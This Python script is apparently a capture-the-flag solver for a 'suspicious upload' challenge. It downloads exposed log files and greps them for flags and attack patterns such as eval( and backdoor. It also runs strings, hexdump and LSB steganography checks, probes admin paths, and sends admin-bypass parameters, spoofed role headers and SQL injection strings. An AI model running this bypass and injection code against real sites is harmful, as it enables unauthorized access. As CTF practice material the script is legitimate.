#!/usr/bin/env python3
"""
Advanced Suspicious Upload Challenge Solver
Focuses on Linux command-line tools, steganography, and HTTP parameter manipulation

This script implements advanced techniques for:
1. Server log analysis using Linux tools
2. Steganography detection and extraction
3. HTTP parameter manipulation for admin access
"""

import requests
import subprocess
import os
import re
import base64
import hashlib
import json
from urllib.parse import urlencode, quote
import tempfile
import shutil

class AdvancedSuspiciousUploadSolver:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.temp_dir = tempfile.mkdtemp()
        
    def __del__(self):
        """Cleanup temporary directory"""
        try:
            shutil.rmtree(self.temp_dir)
        except:
            pass
    
    def linux_log_analysis(self):
        """Use Linux command-line tools for log analysis"""
        print("\n" + "="*80)
        print("LINUX COMMAND-LINE LOG ANALYSIS")
        print("="*80)
        
        # Download potential log files
        log_urls = [
            '/access.log',
            '/error.log', 
            '/server.log',
            '/apache.log',
            '/nginx.log',
            '/app.log',
            '/debug.log',
            '/audit.log',
            '/security.log',
            '/upload.log',
            '/admin.log'
        ]
        
        downloaded_logs = []
        
        for log_url in log_urls:
            try:
                response = self.session.get(f"{self.base_url}{log_url}", timeout=10)
                if response.status_code == 200 and response.text:
                    log_file = os.path.join(self.temp_dir, f"log_{len(downloaded_logs)}.txt")
                    with open(log_file, 'w', encoding='utf-8', errors='ignore') as f:
                        f.write(response.text)
                    downloaded_logs.append((log_url, log_file))
                    print(f"[+] Downloaded log: {log_url} ({len(response.text)} bytes)")
            except:
                continue
        
        # Analyze logs with Linux tools
        for log_url, log_file in downloaded_logs:
            print(f"\n[*] Analyzing {log_url}")
            self.analyze_log_with_linux_tools(log_file)
    
    def analyze_log_with_linux_tools(self, log_file):
        """Analyze log file using Linux command-line tools"""
        
        # 1. grep for suspicious patterns
        suspicious_patterns = [
            r'HW\{[^}]+\}',  # Flag pattern
            r'admin.*password',
            r'backdoor',
            r'shell',
            r'upload.*\.php',
            r'eval\(',
            r'system\(',
            r'exec\(',
            r'base64_decode',
            r'secret.*=',
            r'key.*=',
            r'token.*='
        ]
        
        for pattern in suspicious_patterns:
            try:
                result = subprocess.run(['grep', '-i', '-E', pattern, log_file], 
                                      capture_output=True, text=True, timeout=10)
                if result.stdout:
                    print(f"  [!] Pattern '{pattern}' found:")
                    for line in result.stdout.strip().split('\n')[:3]:
                        print(f"    {line[:100]}")
                    
                    # Check for flag
                    flag_match = re.search(r'HW\{[^}]+\}', result.stdout)
                    if flag_match:
                        print(f"  🚩 FLAG FOUND: {flag_match.group()}")
                        return flag_match.group()
            except:
                continue
        
        # 2. awk for field extraction
        try:
            # Extract IP addresses
            result = subprocess.run(['awk', '{print $1}', log_file], 
                                  capture_output=True, text=True, timeout=10)
            if result.stdout:
                ips = set(result.stdout.strip().split('\n'))
                suspicious_ips = [ip for ip in ips if ip.startswith('127.') or ip.startswith('192.168.') or ip == 'localhost']
                if suspicious_ips:
                    print(f"  [!] Suspicious IPs: {suspicious_ips[:5]}")
        except:
            pass
        
        # 3. sort and uniq for frequency analysis
        try:
            # Most common requests
            result = subprocess.run(['awk', '{print $7}', log_file], 
                                  capture_output=True, text=True, timeout=10)
            if result.stdout:
                sort_result = subprocess.run(['sort'], input=result.stdout, 
                                           capture_output=True, text=True, timeout=10)
                uniq_result = subprocess.run(['uniq', '-c'], input=sort_result.stdout,
                                           capture_output=True, text=True, timeout=10)
                if uniq_result.stdout:
                    print(f"  [*] Most common requests:")
                    for line in uniq_result.stdout.strip().split('\n')[:5]:
                        print(f"    {line.strip()}")
        except:
            pass
        
        # 4. sed for pattern replacement and extraction
        try:
            # Extract URLs with parameters
            result = subprocess.run(['sed', '-n', 's/.*GET \\([^ ]*\\).*/\\1/p', log_file],
                                  capture_output=True, text=True, timeout=10)
            if result.stdout:
                urls_with_params = [url for url in result.stdout.strip().split('\n') if '?' in url]
                if urls_with_params:
                    print(f"  [*] URLs with parameters:")
                    for url in urls_with_params[:5]:
                        print(f"    {url}")
                        # Check for admin parameters
                        if any(param in url.lower() for param in ['admin', 'user', 'role', 'auth']):
                            print(f"      [!] Suspicious parameter in: {url}")
        except:
            pass
    
    def advanced_steganography_detection(self):
        """Advanced steganography detection and extraction"""
        print("\n" + "="*80)
        print("ADVANCED STEGANOGRAPHY DETECTION")
        print("="*80)
        
        # Find and download suspicious files
        file_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.wav', '.mp3', '.txt', '.pdf']
        found_files = self.discover_files(file_extensions)
        
        for file_url, file_path in found_files:
            print(f"\n[*] Analyzing {file_url}")
            flag = self.analyze_file_steganography(file_path)
            if flag:
                return flag
    
    def discover_files(self, extensions):
        """Discover files with specific extensions"""
        found_files = []
        
        # Common file directories
        directories = ['/uploads', '/files', '/images', '/static', '/assets', '/media', '/public']
        
        for directory in directories:
            try:
                response = self.session.get(f"{self.base_url}{directory}/", timeout=10)
                if response.status_code == 200:
                    # Parse directory listing
                    for ext in extensions:
                        pattern = rf'href="([^"]*{re.escape(ext)})"'
                        matches = re.findall(pattern, response.text, re.IGNORECASE)
                        for match in matches:
                            file_url = f"{self.base_url}{directory}/{match}"
                            file_path = self.download_file(file_url, match)
                            if file_path:
                                found_files.append((file_url, file_path))
            except:
                continue
        
        # Also try direct file access
        common_files = [
            'image.jpg', 'photo.png', 'upload.jpg', 'file.txt', 'data.txt',
            'secret.jpg', 'hidden.png', 'admin.jpg', 'backdoor.txt'
        ]
        
        for filename in common_files:
            try:
                file_url = f"{self.base_url}/{filename}"
                response = self.session.get(file_url, timeout=5)
                if response.status_code == 200:
                    file_path = self.download_file(file_url, filename)
                    if file_path:
                        found_files.append((file_url, file_path))
            except:
                continue
        
        return found_files
    
    def download_file(self, url, filename):
        """Download file to temporary directory"""
        try:
            response = self.session.get(url, timeout=10)
            if response.status_code == 200:
                file_path = os.path.join(self.temp_dir, filename)
                with open(file_path, 'wb') as f:
                    f.write(response.content)
                return file_path
        except:
            pass
        return None
    
    def analyze_file_steganography(self, file_path):
        """Comprehensive steganography analysis"""
        filename = os.path.basename(file_path)
        
        # 1. File command analysis
        try:
            result = subprocess.run(['file', file_path], capture_output=True, text=True, timeout=5)
            print(f"  File type: {result.stdout.strip()}")
        except:
            pass
        
        # 2. Strings extraction
        flag = self.extract_strings(file_path)
        if flag:
            return flag
        
        # 3. Hexdump analysis
        self.hexdump_analysis(file_path)
        
        # 4. Image-specific steganography
        if any(ext in filename.lower() for ext in ['.jpg', '.jpeg', '.png', '.gif', '.bmp']):
            flag = self.image_steganography_analysis(file_path)
            if flag:
                return flag
        
        # 5. Audio steganography
        if any(ext in filename.lower() for ext in ['.wav', '.mp3']):
            flag = self.audio_steganography_analysis(file_path)
            if flag:
                return flag
        
        return None
    
    def extract_strings(self, file_path):
        """Extract strings and look for flags"""
        try:
            result = subprocess.run(['strings', file_path], capture_output=True, text=True, timeout=10)
            if result.stdout:
                print(f"  [*] Strings extracted ({len(result.stdout)} chars)")
                
                # Look for flag
                flag_match = re.search(r'HW\{[^}]+\}', result.stdout)
                if flag_match:
                    print(f"  🚩 FLAG FOUND IN STRINGS: {flag_match.group()}")
                    return flag_match.group()
                
                # Look for base64 encoded data
                b64_matches = re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', result.stdout)
                for b64 in b64_matches[:5]:
                    try:
                        decoded = base64.b64decode(b64).decode('utf-8', errors='ignore')
                        if 'HW{' in decoded:
                            flag_match = re.search(r'HW\{[^}]+\}', decoded)
                            if flag_match:
                                print(f"  🚩 FLAG FOUND IN BASE64: {flag_match.group()}")
                                return flag_match.group()
                    except:
                        continue
                
                # Look for suspicious strings
                suspicious = re.findall(r'.*(admin|password|secret|key|token|backdoor).*', result.stdout, re.IGNORECASE)
                if suspicious:
                    print(f"  [!] Suspicious strings found:")
                    for s in suspicious[:3]:
                        print(f"    {s.strip()[:80]}")
        except:
            pass
        return None
    
    def hexdump_analysis(self, file_path):
        """Analyze file with hexdump"""
        try:
            result = subprocess.run(['hexdump', '-C', file_path], capture_output=True, text=True, timeout=10)
            if result.stdout:
                # Look for flag pattern in hex
                flag_match = re.search(r'HW\{[^}]+\}', result.stdout)
                if flag_match:
                    print(f"  🚩 FLAG FOUND IN HEXDUMP: {flag_match.group()}")
                    return flag_match.group()
                
                # Look for hidden data at end of file
                lines = result.stdout.strip().split('\n')
                if len(lines) > 10:
                    print(f"  [*] File ends with: {lines[-3:]}")
        except:
            pass
    
    def image_steganography_analysis(self, file_path):
        """Image-specific steganography analysis"""
        print(f"  [*] Image steganography analysis")
        
        # LSB extraction
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            
            # Extract LSBs from image data (skip header)
            header_size = min(1000, len(data) // 4)
            image_data = data[header_size:]
            
            lsb_bits = []
            for byte in image_data[:10000]:  # Analyze first 10KB
                lsb_bits.append(byte & 1)
            
            # Convert bits to bytes
            extracted_bytes = []
            for i in range(0, len(lsb_bits) - 7, 8):
                byte_val = 0
                for j in range(8):
                    byte_val |= (lsb_bits[i + j] << j)
                extracted_bytes.append(byte_val)
            
            # Convert to string
            extracted_text = ''.join(chr(b) for b in extracted_bytes if 32 <= b <= 126)
            
            if len(extracted_text) > 20:
                print(f"  [*] LSB extracted: {extracted_text[:100]}...")
                
                # Check for flag
                flag_match = re.search(r'HW\{[^}]+\}', extracted_text)
                if flag_match:
                    print(f"  🚩 FLAG FOUND IN LSB: {flag_match.group()}")
                    return flag_match.group()
        except:
            pass
        
        return None
    
    def audio_steganography_analysis(self, file_path):
        """Audio steganography analysis"""
        print(f"  [*] Audio steganography analysis")
        
        # Simple LSB extraction from audio data
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            
            # Skip WAV header (44 bytes) if it's a WAV file
            audio_data = data[44:] if file_path.lower().endswith('.wav') else data[1000:]
            
            # Extract LSBs
            lsb_bits = []
            for byte in audio_data[:50000]:  # First 50KB
                lsb_bits.append(byte & 1)
            
            # Convert to text
            extracted_text = ''
            for i in range(0, len(lsb_bits) - 7, 8):
                byte_val = 0
                for j in range(8):
                    byte_val |= (lsb_bits[i + j] << j)
                if 32 <= byte_val <= 126:
                    extracted_text += chr(byte_val)
                else:
                    extracted_text += '.'
            
            if len(extracted_text) > 20:
                print(f"  [*] Audio LSB: {extracted_text[:100]}...")
                
                flag_match = re.search(r'HW\{[^}]+\}', extracted_text)
                if flag_match:
                    print(f"  🚩 FLAG FOUND IN AUDIO LSB: {flag_match.group()}")
                    return flag_match.group()
        except:
            pass
        
        return None
    
    def http_parameter_manipulation(self):
        """Advanced HTTP parameter manipulation"""
        print("\n" + "="*80)
        print("HTTP PARAMETER MANIPULATION")
        print("="*80)
        
        # Find admin/login endpoints
        admin_endpoints = self.discover_admin_endpoints()
        
        for endpoint in admin_endpoints:
            print(f"\n[*] Testing {endpoint}")
            flag = self.test_parameter_bypass(endpoint)
            if flag:
                return flag
    
    def discover_admin_endpoints(self):
        """Discover admin and login endpoints"""
        endpoints = []
        
        common_paths = [
            '/admin', '/login', '/admin.php', '/admin/', '/administrator',
            '/panel', '/dashboard', '/control', '/manage', '/backend',
            '/admin/login', '/admin/panel', '/admin/dashboard',
            '/wp-admin', '/phpmyadmin', '/adminer'
        ]
        
        for path in common_paths:
            try:
                response = self.session.get(f"{self.base_url}{path}", timeout=5)
                if response.status_code in [200, 302, 401, 403]:
                    endpoints.append(path)
                    print(f"[+] Found endpoint: {path} (Status: {response.status_code})")
            except:
                continue
        
        return endpoints
    
    def test_parameter_bypass(self, endpoint):
        """Test various parameter bypass techniques"""
        url = f"{self.base_url}{endpoint}"
        
        # Parameter pollution techniques
        bypass_techniques = [
            # Simple bypasses
            {'admin': 'true'},
            {'admin': '1'},
            {'role': 'admin'},
            {'user': 'admin'},
            {'access': 'admin'},
            {'level': 'admin'},
            {'privilege': 'admin'},
            {'auth': 'true'},
            {'authenticated': 'true'},
            {'logged_in': 'true'},
            {'is_admin': 'true'},
            
            # Array bypasses
            {'admin[]': 'true'},
            {'admin[0]': 'true'},
            {'role[]': 'admin'},
            
            # Multiple parameters
            {'admin': 'true', 'user': 'admin'},
            {'role': 'admin', 'access': 'true'},
            
            # Encoded bypasses
            {'admin': quote('true')},
            {'role': quote('admin')},
            
            # SQL injection attempts
            {'admin': "' OR '1'='1"},
            {'user': "admin'--"},
            {'password': "' OR 1=1--"},
        ]
        
        methods = ['GET', 'POST', 'PUT', 'PATCH']
        
        for method in methods:
            for params in bypass_techniques:
                try:
                    if method == 'GET':
                        response = self.session.get(url, params=params, timeout=5)
                    else:
                        response = self.session.request(method, url, data=params, timeout=5)
                    
                    # Check for successful bypass
                    success_indicators = ['welcome admin', 'admin panel', 'dashboard', 'logout', 'admin area']
                    if any(indicator in response.text.lower() for indicator in success_indicators):
                        print(f"  [+] Potential bypass: {method} with {params}")
                        
                        # Check for flag
                        flag_match = re.search(r'HW\{[^}]+\}', response.text)
                        if flag_match:
                            print(f"  🚩 FLAG FOUND: {flag_match.group()}")
                            return flag_match.group()
                    
                    # Also test with headers
                    headers = {'X-Admin': 'true', 'X-Role': 'admin'}
                    if method == 'GET':
                        response = self.session.get(url, params=params, headers=headers, timeout=5)
                    else:
                        response = self.session.request(method, url, data=params, headers=headers, timeout=5)
                    
                    if any(indicator in response.text.lower() for indicator in success_indicators):
                        print(f"  [+] Header bypass: {method} with {params} + headers")
                        
                        flag_match = re.search(r'HW\{[^}]+\}', response.text)
                        if flag_match:
                            print(f"  🚩 FLAG FOUND: {flag_match.group()}")
                            return flag_match.group()
                            
                except Exception as e:
                    continue
        
        return None
    
    def solve(self):
        """Main solving function"""
        print("="*80)
        print("ADVANCED SUSPICIOUS UPLOAD CHALLENGE SOLVER")
        print("="*80)
        print(f"Target: {self.base_url}")
        print("="*80)
        
        try:
            # Step 1: Linux command-line log analysis
            self.linux_log_analysis()
            
            # Step 2: Advanced steganography detection
            flag = self.advanced_steganography_detection()
            if flag:
                return flag
            
            # Step 3: HTTP parameter manipulation
            flag = self.http_parameter_manipulation()
            if flag:
                return flag
            
            print("\n" + "="*80)
            print("AUTOMATED ANALYSIS COMPLETE")
            print("="*80)
            print("Manual investigation may be required for:")
            print("1. Advanced steganography tools (steghide, outguess, stegsolve)")
            print("2. Custom parameter combinations")
            print("3. Time-based or blind injection techniques")
            print("4. Social engineering based on discovered clues")
            
        except KeyboardInterrupt:
            print("\n[!] Analysis interrupted by user")
        except Exception as e:
            print(f"\n[!] Error during analysis: {e}")
        
        return None

def main():
    import sys
    
    if len(sys.argv) != 2:
        print("Usage: python3 suspicious_upload_advanced.py <challenge_url>")
        print("Example: python3 suspicious_upload_advanced.py https://suspicious-upload.example.com")
        sys.exit(1)
    
    challenge_url = sys.argv[1]
    solver = AdvancedSuspiciousUploadSolver(challenge_url)
    
    flag = solver.solve()
    
    if flag:
        print(f"\n🎉 SUCCESS! FLAG: {flag}")
    else:
        print("\n❌ Flag not found automatically. Check the analysis output for clues.")

if __name__ == "__main__":
    main()